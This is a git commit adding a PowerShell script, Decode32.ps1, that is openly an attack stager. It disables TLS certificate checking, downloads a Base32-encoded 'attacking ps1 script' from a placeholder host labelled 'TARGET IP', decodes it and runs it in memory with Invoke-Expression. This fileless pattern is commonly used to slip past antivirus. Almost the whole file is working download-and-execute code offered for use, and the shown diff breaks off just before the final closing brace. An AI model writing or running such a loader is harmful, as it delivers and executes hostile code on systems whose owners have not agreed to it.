ce73671136b436a430cbbb993111f77013196e57
yasuhiro0224 <53889661+yasuhiro0224@users.noreply.github.com>
2025-02-05 08:02:11 -0500

    Add files via upload

---
+++ Decode32.ps1
@@ -0,0 +1,56 @@
+# Base32 Decoding function
+function Decode-Base32 {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$EncodedText
+    )
+
+    $base32chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
+    $byteOutput = New-Object byte[]([math]::ceiling($EncodedText.Length * 5 / 8))
+    $byteCount = 0
+    $buffer = 0
+    $bitsRemaining = 0
+
+    foreach ($c in $EncodedText.ToUpper().ToCharArray()) {
+        $value = [array]::IndexOf($base32chars.ToCharArray(), $c)
+        if ($value -eq -1) {
+            throw "Invalid Base32 character '$c'"
+        }
+        $buffer = ($buffer -shl 5) -bor $value
+        $bitsRemaining += 5
+
+        if ($bitsRemaining -ge 8) {
+            $byteOutput[$byteCount++] = [byte]($buffer -shr ($bitsRemaining - 8))
+            $bitsRemaining -= 8
+            $buffer = $buffer -band ([math]::pow(2, $bitsRemaining) - 1)
+        }
+    }
+
+    return ,$byteOutput[0..($byteCount - 1)]
+}
+
+# SSL/TLS configuration
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+
+# Specify URL from which attacking ps1 script is downloaded
+$fileUrl = "https://TARGET IP/Penguin32.txt"
+
+# DL the file and execute it on memory
+try {
+    $webClient = New-Object System.Net.WebClient
+    $encodedData = $webClient.DownloadString($fileUrl)
+
+    # Remove illegitimate charactors
+    $encodedData = $encodedData -replace "[^A-Z2-7]", ""
+
+    $decodedBytes = Decode-Base32 $encodedData
+
+    # execute the file on memory
+    Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decodedBytes))
+}
+catch {
+    Write-Host "Error when downloading or executing the file: $_"
+}
+finally {
+    $webClient.Dispose()
